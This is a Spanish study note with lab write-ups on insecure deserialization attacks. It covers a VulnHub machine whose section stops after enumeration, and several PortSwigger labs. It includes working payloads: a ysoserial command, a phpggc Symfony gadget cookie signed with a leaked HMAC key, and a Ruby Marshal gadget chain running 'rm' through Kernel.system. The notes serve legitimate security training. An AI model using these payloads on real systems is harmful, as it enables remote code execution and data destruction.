---
aliases: ["Deserialización", "Deserialization Attacks"]
tags: ["hacking/web", "hacking/laboratorios"]
estado: 🟢 Terminado
---

Los **ataques de deserialización** son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de **serialización** y **deserialización** de objetos en aplicaciones que utilizan la programación orientada a objetos (**POO**).

> [!info] Conceptos Clave
> *   **Serialización**: Proceso de convertir un objeto en una secuencia de bytes que puede ser almacenada o transmitida a través de una red.
> *   **Deserialización**: Proceso inverso, donde una secuencia de bytes es convertida de nuevo a un objeto.
> *   **Vulnerabilidad**: Ocurre cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a la **ejecución de código malicioso** en el servidor.

Los ataques de deserialización pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras, como:

*   Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso.
*   Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
*   Realizar un ataque de “**man-in-the-middle**” para interceptar y modificar el objeto serializado antes de que llegue a la aplicación.

Los ataques de deserialización pueden ser muy peligrosos, ya que pueden permitir que un atacante tome el control completo del servidor o la aplicación que está siendo atacada.

Para evitar estos ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserialización seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para corregir posibles vulnerabilidades.

A continuación, se os proporciona el enlace directo a la máquina de Vulnhub donde explotamos un ‘**PHP Deserialization Attack**‘:

*   **Máquina Cereal 1**: [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)

## Notas de las Prácticas

Ya con la máquina desplegada, vamos a ir un poco más al grano, donde vamos a realizar fuzzing a la web alojada en el puerto 80:

```bash
gobuster dir -u http://192.168.1.73 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

![[Pasted image 20250826181028.png]]

Como podemos observar, tenemos 2 directorios. Vamos a abrirlos ambos para ver qué nos encontramos:

![[Pasted image 20250827093247.png]]

En este caso, no nos llama la atención ninguna de las dos, por lo que ahora vamos a escanear subdominios en el puerto 44441:

```bash
gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --append-domain
```

> [!tip] Gobuster Vhost
> El comando `gobuster vhost` se utiliza para enumerar subdominios (virtual hosts) en un servidor web. Es útil cuando se sospecha que un servidor aloja múltiples sitios web o aplicaciones bajo diferentes nombres de host en el mismo puerto. La opción `--append-domain` es crucial para que `gobuster` pruebe subdominios como `subdominio.cereal.ctf` en lugar de solo `subdominio`.

![[Pasted image 20250827093630.png]]

Podemos ver que tenemos un subdominio en la web, por lo que vamos a ver qué contiene:

## PortSwigger Labs

### Lab: Modificando objetos serializados

En este laboratorio se nos pide intentar vulnerar la deserialización de un objeto. Al parecer, esto se encuentra en la cookie de sesión, por lo tanto, vamos a intentar iniciar sesión con las credenciales que nos dieron y vamos a ver qué tiene de especial la cookie.

Vamos a capturar una petición que contenga la cookie de sesión:

![[{EE7E8889-19BC-41BE-929A-90FCAB9DFA05}.png]]

Vemos que al seleccionar la cookie en el lado derecho, Burp Suite se encarga de verificar el contenido en diferentes lenguajes y que al final hace un `decode` en `base64` que nos da información sobre el usuario, donde vemos que para un parámetro `admin` se le asigna un valor booleano de `0`. Podemos desde el mismo panel cambiarlo a `1`, que sería un `True`, y aplicar cambios para usarla:

![[{6B1698DF-48BE-4A91-A44B-CE083D67DF7F}.png]]

Vemos que la cookie no cambia mucho, pero con esto simplemente ya nos permite el acceso a un panel de administración. Con esto podemos intentar usar la cookie en el navegador.

Un dato extra que tenemos que tomar en cuenta es la estructura que se está usando. La estructura al parecer es de PHP Serialize Object.

Vemos ahora esto ya en el navegador:

![[{0FF8820C-41C7-44D4-80CD-66DBFB3DA2B9}.png]]

Ya podemos administrar usuarios. Eliminemos al usuario `carlos` y terminemos con el laboratorio:

![[{F83DFC42-312F-4C55-B2CD-2B8FDD3D4C61}.png]]

Lab terminado.

### Lab: Modificando tipos de datos serializados

En este laboratorio lo que vamos a ver es que es vulnerable a un bypass en la autenticación. Tenemos que editar el objeto que viaja en la cookie de sesión. Vamos a intentar ingresar como administrador y luego eliminar el usuario `carlos`.

Bueno, para esto vamos a capturar cómo se maneja el panel de autenticación con el objetivo de ver la data serializada que supuestamente se procesa en la cookie de sesión mientras estamos como el usuario `wiener` del cual tenemos las credenciales:

![[{3D515CA1-500C-4B96-9CBE-48F3B8F9CF4A}.png]]

Vemos lo mismo, el objeto está en `base64` y al decodificarlo obtenemos la información del usuario. Por practicidad, vamos a llevarlo a la consola para verlo mucho mejor:
![[{C07494C6-E9DF-4051-9163-71A100F8738D}.png]]

Perfecto, ahora vemos mucho más claro y contamos con un `access_token` de 32 caracteres, el cual podría estar encargado de asegurar la integridad del usuario.

Ahora, como se nos dijo al inicio del laboratorio, nosotros podemos editar este tipo de datos y modificarlos. La idea es cambiar dos campos: el primero será el de `username` y el otro el de `access_token`, quedando de la siguiente forma:

![[{38F7B4E9-5A6E-4B7C-8AFC-BE03631B8287}.png]]


Perfecto, podemos aplicar los cambios y enviar la petición a ver qué obtenemos:

![[{30A9649C-25E3-4CC6-8086-E4A590143468}.png]]

Perfecto, la cookie ya es válida al parecer. Vamos a hacerlo desde el navegador y a eliminar al usuario `carlos`:

![[{9A52863A-9CC0-4CF7-95C1-A80216CCF26B}.png]]

Eliminemos el usuario `carlos` y vemos si logramos completar el lab:

![[{BD0C2772-5093-49A4-901A-A41B6AF0C2E1}.png]]

Lab Terminado.

### Lab: Explotando la deserialización insegura mediante funcionalidad de la aplicación

En este laboratorio, el objetivo es crear un objeto serializado que, al parecer, es la cookie de sesión, mediante la cual logremos eliminar un archivo dentro del `home` de `carlos` llamado `morale.txt`. Tenemos acceso como el usuario `wiener`.

Vamos a comenzar iniciando sesión y capturando la petición dentro para ver la cookie:

![[{0E14CD16-D9BE-45B6-94D4-E52A6C6FBAB9}.png]]

Perfecto, ya tenemos la data serializada, la cual para una mejor comprensión vamos a llevarla a la consola:

![[{3E8637B9-6D94-465D-B740-A7CB434048F3}.png]]

Estamos viendo la data y algo que llama mucho la atención es que se está contemplando en `avatar_link` una ruta.

Nosotros podemos eliminar la cuenta de un usuario, pero ¿qué pasa con el avatar? Lo que sucede es que también se elimina, en este caso, el archivo dentro de la ruta. Lo que podemos hacer es cambiar la ruta del avatar y apuntar al archivo que nos piden eliminar con el objetivo de que cuando eliminemos la cuenta, se elimine el archivo que se pide eliminar:

![[{DFDAD146-53A0-448C-8066-5A0B038FED25}.png]]

En este caso, no voy a enviar la petición, sino a reemplazar la cookie dentro del navegador para que se establezca la ruta:

![[{D9A58AFB-B327-4B57-9C00-9DA27EAB817D}.png]]

No vemos cambio alguno, pero vamos a eliminar la cuenta. Vamos a ver si logramos completar el lab:

![[{40EB7551-2844-4B8C-ABCB-5420204E664C}.png]]

Lab Terminado.

### Lab: Inyección arbitraria de objetos en PHP

El objetivo es el mismo: para resolver, tenemos que crear e inyectar el objeto malicioso que nos permita eliminar el archivo `morale.txt` dentro del `home` de `carlos`. Vamos a tener que obtener código fuente para lograr resolver este laboratorio y nos dan, igual que antes, las credenciales de `wiener`.

Vamos de igual forma a capturar una petición donde tengamos la sesión iniciada con el objetivo de capturar la cookie de sesión:
![[{DC981460-CF87-4A1F-88D4-0D1E3CD1574D}.png]]

Volvemos a observar el objeto `User` con los campos `username` y `access_token`. En este caso, el laboratorio nos habla más sobre un objeto arbitrario y que nos fijemos en el código fuente, por lo que vamos a ver primero si encontramos algo interesante en el código fuente:

![[{87EAF222-7062-49BC-BF61-E0800FEBAD2B}.png]]

Vemos una ruta la cual podemos visitar a ver qué encontramos:

![[{8074E395-9D6B-47F5-80BF-C8DE0FC72AE7}.png]]

No vemos nada y es que puede que se esté interpretando la información que contiene el mismo.

> [!tip] Archivos de Backup en Editores
> Algunos editores de código o texto suelen crear copias de seguridad de los archivos. Por ejemplo, `vim` a menudo ubica una `~` después de la extensión del archivo (ej. `index.php~`). Esto puede ser una fuente valiosa de código fuente o información sensible.

Vemos si esto funciona:

![[{0B9C2C4F-7FF9-445A-BE48-792EA6284C30}.png]]

Al parecer, sí se generó dicha copia para este archivo y pues ya tenemos todo el código que se está ejecutando. Vamos a analizarlo.

Mirando un poco el código, vemos que se está definiendo y operando con los datos de `template_file_path` y `lock_file_path`. Ahora, si pensamos un poco en esto, lo que sucede es que se podría asignar a alguna de estas variables la ruta del archivo que queremos eliminar y el objetivo sería ver una función que nos permita solo eliminar.

Vemos varios métodos y entre ellos el destructor (`__destruct`), el cual verifica la existencia de un archivo (en este caso, el almacenado en `lock_file_path`) y que además, si existe, lo que hace es `unlink`, que es una función que elimina archivos en el sistema dentro del servidor.

> [!info] Método Mágico `__destruct` en PHP
> El método mágico `__destruct()` en PHP se ejecuta automáticamente cuando un objeto es destruido o cuando el script finaliza. Si un atacante puede controlar las propiedades de un objeto que se deserializa y ese objeto tiene un método `__destruct()` que realiza operaciones sensibles (como `unlink()` para eliminar archivos), puede llevar a la ejecución de código arbitrario o eliminación de archivos.

Esto ya es muy interesante y para comprender cómo podemos ejecutar el método `__destruct`, tenemos que comprender que cuando un objeto se inicia sin la asignación de este a una variable, el objeto pasará por todo su ciclo de vida. Esto conlleva desde la creación hasta su destrucción, y es de esto de lo que vamos a tratar de aprovecharnos.

Bueno, lo que vamos a hacer es, tomando como base el objeto ya generado, crearemos uno con los datos que hemos obtenido del archivo analizado a ver si logramos eliminar el archivo y nos quedaría de la siguiente forma:

![[{3795EBFF-FB04-4223-BFA1-3E8B32C174EF}.png]]

Lo pasamos por Burp Suite para que nos genere la cookie:

![[{E4A98AF5-8739-4815-9774-FBFD16502C60}.png]]

Ahora copiamos la cookie y la usamos en el navegador a ver si funciona:

![[{48EF75A6-AD4A-4258-85FC-2542287C25B1}.png]]

Se generó un error, pero la máquina se completa. Esto quiere decir que el archivo sí se eliminó.

Lab Terminado.

### Lab: Explotando deserialización Java con Apache Commons

El objetivo es crear un payload malicioso implementando una utilidad, la cual en el proceso se explicará, y al igual que en las anteriores, tenemos las credenciales de `wiener`. El objetivo será eliminar el archivo `morale.txt` que se encuentra en el `home` del usuario `carlos`.

Bueno, lo primero que vamos a hacer es descargar la utilidad de `ysoserial-all.jar`, la cual contiene una gran cantidad de Gadget chains que son cadenas de clases existentes que nos permitirán ejecutar código o comandos de forma remota al momento de deserializar un objeto.

![[{6C93FA87-87B2-46DF-A959-0A91454C1871}.png]]
Tenemos muchos y cabe comentar que cada uno tiene librerías y métodos distintos de alcanzar la ejecución de comandos.

Podemos intentar hacer lo siguiente para crear el payload:
```bash
java -jar ysoserial-all.jar CommonsCollections1 'whoami'
```

> [!info] ysoserial y Gadget Chains
> `ysoserial` es una herramienta de código abierto para generar payloads de deserialización en Java. Utiliza "gadget chains", que son secuencias de llamadas a métodos en clases existentes en el classpath de la aplicación vulnerable. Cuando un objeto serializado maliciosamente es deserializado, estas cadenas de gadgets pueden ser activadas para ejecutar código arbitrario. `CommonsCollections1` es una de las cadenas de gadgets más conocidas y potentes.

![[{F462974A-FEB6-455B-839E-351F5703D532}.png]]

Bueno, vamos a capturar una petición la cual nos permita ver en sí cómo se está generando la cookie primero:
![[{B5725FBD-B0ED-4CB4-B400-E7803507A35B}.png]]

Por lo que vemos, tiene que estar en `base64` y luego tenemos que hacerle un `URL-encode`. Entonces, para generar el `base64` va a ser de la siguiente manera:

![[{20B84B20-D9D4-4AF1-88CF-1433411DD11C}.png]]

Con esto ya tenemos la cookie respectiva que ejecutará el comando. En este punto, falta pasarle todo a `URL-encode` para ver qué sucede:
![[{0DF59856-5FBC-4F90-84CE-F59EFFAC138B}.png]]

Esa en especial no le gusta, pero nosotros tenemos referentes a `CommonsCollections` varios, y luego de probar la mayoría, obtenemos que el correcto es el de `CommonsCollections4` y lo mismo. Vamos a ver si ahora funciona:
![[{8DB278F9-09ED-46AB-9979-C64BF182B291}.png]]

Lab Terminado.

### Lab: Explotando deserialización PHP con una cadena de gadgets preconstruida

En este caso, tenemos el mismo caso que la máquina anterior, pero para PHP, ya que vamos a crear un payload mediante un Gadget para eliminar el archivo `morale.txt`. Para esto, lo que vamos a implementar es otra herramienta parecida a `ysoserial` que se llama `phpggc`. Algo adicional que tenemos que hacer es la identificación del framework.

Vamos a comenzar buscando en el código fuente a ver si algo encontramos:

![[{17040B07-A0D6-432A-8756-11AE91F5CB0A}.png]]
Encontramos una ruta la cual podemos visitar a ver qué encontramos:
![[{BB49BA51-83E9-4BEA-95A8-7E29123D30DC}.png]]

Vemos que tenemos un `phpinfo` que sí nos lista parte de la información y permisos configurados en el aplicativo de PHP.

Eso lo dejaremos por el momento y vamos a ver cómo está construida la cookie a ver qué podemos conseguir:

![[{38C4CB14-61CA-4FA9-90ED-24C970C03601} 1.png]]

Vemos que tenemos la información solo `URL-encode` y nos representa sus valores. Vamos a llevarnos estos aparte para verlos mucho mejor:

![[{F21F46C5-427F-412B-938F-69CFF646C8A1}.png]]

Vemos parte de la cadena en `base64`. Vamos a decodificarla a ver qué tenemos:

![[{671F3A19-A9BC-41E5-986C-1B9D73077BA5}.png]]

Vemos un objeto como en máquinas anteriores y cosas que se nos pueden venir a la mente son cambiar el tipo de dato de `access_token`, cambiar el nombre de usuario y más, pero algo que llama la atención es que todo esto en la cadena anterior está acompañado de un `sig_hmac_sha1`, que es una especie de firma que nos permite verificar la integridad de un mensaje.

> [!warning] HMAC y Deserialización
> Un Hash-based Message Authentication Code (HMAC) se utiliza para verificar la integridad y autenticidad de un mensaje. Si los datos serializados están firmados con un HMAC, manipular los datos sin conocer la `secret key` resultará en una firma inválida, y la aplicación rechazará los datos. Para explotar esto, es necesario encontrar la `secret key` utilizada para generar el HMAC.

El problema radica en que si manipulamos la integridad de estos datos cambiando algo, su firma también cambiará y si no tiene coherencia la firma con el contenido, esto no será válido.

Y cómo se crea esta firma es un concepto sencillo: se necesita de un contenido (datos) y una `secret key` la cual no sabemos cuál es, pero si recordamos, nosotros tenemos información del panel de `phpinfo` mediante el cual podríamos filtrar por `key` y deberíamos encontrar la `secret key` filtrada, por lo que ya tenemos todo:

![[{1BA0BAE0-69F5-43D5-8053-2811532FD3DF}.png]]

Con esto, lo único que nos falta es entender cuál es la forma y el gadget que tenemos que usar en el `phpggc` para generar el payload, y lo vamos a hacer por partes.

Para encontrar el gadget, podemos tratar de generar algún error en la cookie borrando caracteres con el objetivo de que se filtre el método usado:

![[{1713E3AE-4BC6-4CB9-9F5B-D1462261DB74}.png]]

Vemos que nos hablan de Symfony, por lo que podemos intentar usar ahora el `phpggc` con Symfony a ver qué conseguimos:

![[{8A5056B8-AEBE-48A2-8ECD-FF74D5EAF11E}.png]]

Vemos que la versión es la `4.3.6` y si observamos el gadget, vemos que nos cubre de la `4.3.0` hasta la `4.3.7`, por lo que este sería el óptimo:

![[{6D4C2FE6-96C2-491B-8990-BD8149235598} 1.png]]

Vemos cómo lo estamos utilizando y cómo generamos ya un objeto válido que ejecuta el comando para eliminar el archivo `morale.txt`. Recordemos que este objeto tiene que estar en `base64`, por lo que vamos a convertirlo y dejarlo listo:

![[{AAF2DB7D-4C13-4F61-8A51-F6D17C4BC5CC}.png]]

Perfecto, ya tenemos la primera parte y ahora lo que vamos a hacer es crear un pequeño código en PHP que nos permita generar la cookie completa de la siguiente manera:
```php
<?php

$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretkey = "jefy711ar0zkh0z3vpry5tpmer8yc10r";
$cookie = '{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretkey) . '"}';

echo $cookie;

?>
```

Ejecutemos el código a ver si nos genera lo que esperamos:
![[{62E4A5E5-2A55-4D75-B560-8130B156FDB8}.png]]

Al parecer sí, y vamos a de una vez realizar un `URL-encode` para luego utilizarlo:

![[{EC8D0E1C-64C3-4E8C-91FA-CC2EE9F5C0B0}.png]]

Vamos a usarla a ver qué sucede:

![[{52A21604-1506-4421-A3C9-951C9B143BC8}.png]]

Vemos que ya tenemos el lab Terminado, por lo que sí logramos la ejecución de comandos.

### Lab: Explotando deserialización Ruby usando una cadena de gadgets documentada

Bueno, nos pide lo mismo que en los últimos laboratorios y el objetivo actual es, mediante documentación, intentar eliminar el archivo `morale.txt` que de igual manera, pero en este caso, se emplea el lenguaje de Ruby.

Vamos a comenzar interceptando la petición del `home` mientras estamos como `wiener` para ver la cookie:

![[{7D7CAA42-B915-42B7-B476-1B96042F1E0B}.png]]

La cadena, luego de cambiar el Decoder a `base64`, vemos que es algo extraña, aunque vemos que viajan cosas como el `username` y un `token`, por lo que la idea sería crear algo que nos permita generar la ejecución remota de comandos.

Mediante una lectura y búsqueda en internet, vamos a ver que obtenemos un script, el cual ya modificado vamos a ver lo siguiente:

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload

```

> [!info] Deserialización en Ruby con `Marshal.load`
> En Ruby, la serialización se realiza con `Marshal.dump` y la deserialización con `Marshal.load`. Al igual que en Java y PHP, `Marshal.load` puede ser vulnerable a la ejecución de código arbitrario si se deserializan objetos maliciosos. Las "gadget chains" en Ruby explotan la forma en que ciertos objetos son reconstruidos y sus métodos son llamados durante el proceso de deserialización.

Perfecto, pero esto no funciona en las versiones actuales, por lo que para probarlo lo que vamos a hacer es correr un docker con una versión anterior de la siguiente manera:

```bash
docker run -it --rm ruby:2.7 bash
```

Ya dentro del contenedor, ejecutamos el archivo y vemos si nos crea la cookie:

![[{E4654004-2825-4B41-B529-08FFA790649C}.png]]

Vemos que ya tenemos algo similar a lo que teníamos en la cookie original, pero esto no está en `base64`, por lo que podemos convertirlo modificando el código de la siguiente manera:
```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer
 
require 'base64'   
 
# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end
 
wa1 = Net::WriteAdapter.new(Kernel, :system)
 
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
 
wa2 = Net::WriteAdapter.new(rs, :resolve)
 
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")
 
 
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)
 
t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)
 
r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)
 
payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)  
```

Vamos a ver cómo nos responde esto:

![[{B60F2416-7EF0-4A72-AD5C-D23C109246E9}.png]]

Esto está mejor, vamos a eliminar los saltos de línea para compactarlo y vamos a ver si funciona:
![[{8488E740-B550-476A-9D1D-AE8C7BB37BEC}.png]]

Ahora lo que podemos hacer es intentar utilizarlo en la cookie y ver si esto funciona:

![[{1768A14E-47DD-48D7-9770-DEB1C3470C7F}.png]]

Lab Terminado.

### Lab: Desarrollando una cadena de gadgets personalizada para deserialización Java

En este laboratorio, vamos a estar como el usuario `wiener` y el punto es que va a viajar algo serializado donde tenemos que explotarla para lograr migrar al usuario administrador obteniendo su contraseña y el objetivo es eliminar al usuario `carlos`.

Vamos a comenzar con la captura de la petición estando como el usuario `wiener` de la siguiente manera:

![[{9F56A8AD-2B1C-495B-9A3A-10632423CCF9}.png]]

Vemos que la data está en `base64` para ver qué es lo que se está tramitando:

![[{05AB50EB-7130-4E6A-9BB9-12C6F135A950} 1.png]]

Bueno, vemos que tenemos un poco de información, pero como no es del todo legible, no podemos cambiar en realidad nada de por aquí. Vamos a buscar en el código fuente de la web a ver qué encontramos:

![[{1B88A903-0038-45B1-B06C-90DCA4386CBE}.png]]

Vemos que nos da una ruta de un backup, el cual podemos entrar a ver qué logramos obtener:

![[{80A87946-5408-4065-8943-7023AFD786DB}.png]]

Podemos observar que tiene el código fuente en Java, el cual vamos a analizar para ver si podemos sacarle provecho.

Vemos que en sí es una clase pública que puede ser interesante si logramos conectarlo con algo más. Podemos ver si el directorio `backup` tiene permisos de listar archivos y si tiene más archivos:
![[{F6B822C4-9774-4F48-A19A-01957729E3AF}.png]]

Vemos otro archivo, veamos su contenido:

![[{10BD125F-AD17-47CC-BEC3-E737864A78D8}.png]]

Vemos una clase pública también `ProductTemplate` donde su constructor solo necesita el parámetro `id`. Si revisamos más por debajo, lo que encontramos es una petición SQL a la cual se le está concatenando el valor de `id`. Esto es interesante porque si mediante la deserialización insegura podríamos explotar una inyección SQL en este caso.

> [!warning] Deserialización y SQL Injection
> Cuando los datos deserializados se utilizan directamente en consultas SQL sin una validación o parametrización adecuada, una vulnerabilidad de deserialización puede convertirse en una inyección SQL. Un atacante puede inyectar código SQL malicioso en el objeto serializado, que luego se ejecutará en la base de datos.

Bueno, nosotros vamos a tener que crear un script personalizado en Java, pero en este caso `PortSwigger` ya nos brinda uno que lo encontraremos en:
https://github.com/PortSwigger/serialization-examples

Vamos a usar ese repositorio donde vamos a usar el recurso en Java.

Primero nos llevamos el `main`:
![[{CAED91CC-1054-48FD-9D72-F28E321A4443}.png]]

También vamos a necesitar las clases que se encuentran dentro del directorio, también quedando 3 archivos:
![[{3C9B2DE9-721B-48DF-A033-EFC3AC96C6B8}.png]]

Bueno, ya con todo esto, nosotros tenemos el control del valor del `id`. Entonces, modificamos eso para pasarle una comilla a ver qué error acontecemos:

![[{A81DE8A8-7C68-416A-A3ED-7DF65F98D310}.png]]

Creamos el objeto para ver el error:

![[{35C39A51-1441-4291-803E-630DBA0DED77}.png]]

Perfecto, ahora podemos cambiarlo en Burp Suite a ver si logramos acontecer el error:
![[{88AC13B8-ECC4-4427-A3C3-D24F542ACB95}.png]]

Excelente, si observamos el error, logramos dejar colgada una comilla. Con esto confirmamos que ingresamos información y tenemos control de ese campo.

Ahora lo que vamos a intentar son pequeños ataques de SQL para descubrir la contraseña de `administrator`:

![[{C40839EE-499B-4EE7-AC70-323DDB0A6FC1}.png]]

![[{41F94BEB-8203-4F0F-9671-04AED003AA4E}.png]]

En mi caso, lo primero que me vino a la mente es usar una SQLi basada en errores donde tratamos de que los errores nos filtren de forma textual la información. En este punto, lo que vamos a hacer es lo mismo, pero para que nos liste la contraseña:

![[{ADAB3327-2C78-4EBF-907C-8C26137F6BC3}.png]]

![[Pasted image 20251008135441.png]]

Vemos que tenemos lo que parece ser la contraseña y podemos usarla:

![[{B712CFEB-1587-4AE7-9349-4064BF279FD3}.png]]

Perfecto, eliminemos al usuario `carlos` y vemos si se completa el laboratorio:

![[{4A127F66-CD1B-495C-B539-B55D81A879F9}.png]]

Lab Terminado.

### Lab: Desarrollando una cadena de gadgets personalizada para deserialización PHP

Al igual que en el laboratorio anterior, lo que vamos a hacer es, mediante un exploit personalizado, crear un payload y eliminar el archivo, en este caso `morale.txt`, que se encuentra en el `home` del usuario `carlos`.

Vamos a comenzar directamente interceptando una petición que maneje la cookie de sesión para ver cómo se está procesando el objeto:

![[{3D752312-3972-4A18-A6F9-315951C4F5CD}.png]]
Podemos observar claramente el objeto con campos `username` y `access_token`. Al igual que en máquinas anteriores, podemos investigar el código fuente a ver qué encontramos:

![[{62653D6E-387D-469D-BBCF-2FEDB6F6E7F7}.png]]

Podemos observar una ruta, vamos a ver de qué se trata:

![[{E54EF24D-221F-416E-A832-6B55CEDF56FB}.png]]

Vemos que al parecer se está listando el código y no se ve nada. Podemos intentar, como en otra máquina, revisar por un archivo backup ubicando una `~` al final:

![[{027F2842-3CE2-4893-B4AF-129018D91E54}.png]]

Listo, vamos a traernos el contenido del archivo a local para poder analizarlo:

Siguiendo un poco el ciclo de cómo funciona este código, encontramos la lógica, pero vemos que no se usa la clase `DefaultMap`. Esta es especial y la clave de todo, ya que cuenta con el método `__get`, el cual se ejecuta cuando una instancia no es existente y se le pasa una función a ejecutar y el argumento no existente. Cuando esto pasa es donde podemos pasarle una función `exec` para ejecutar comandos y que reciba como argumento el valor de `rm /home/carlos/morale.txt`. Ahora, para aprovecharnos de esto, vamos a agregar unas líneas donde vamos a cambiar el flujo actual para que se llame de la siguiente manera a esta clase, además de que para evitar errores y como podemos editar el archivo, vamos a cambiar todo a público:
![[{A4432F23-F4A5-46B9-8D04-ED6DD611D9AC}.png]]

Vemos que tenemos todo listo, vamos a ver qué nos devuelve esto:

![[{E9761194-9B4E-4546-A474-3551F7471C7D}.png]]

Perfecto, ya tenemos el objeto. Podemos intentar usarlo desde Burp Suite a ver qué conseguimos:

![[{F856AE22-8EBB-4FE6-9566-2CC378CABCCC}.png]]

Vemos un error, pero si revisamos la web principal, vamos a observar que se completó el lab:

![[{D4D77245-4278-4894-97BC-19443C4D7F70}.png]]

Lab Terminado.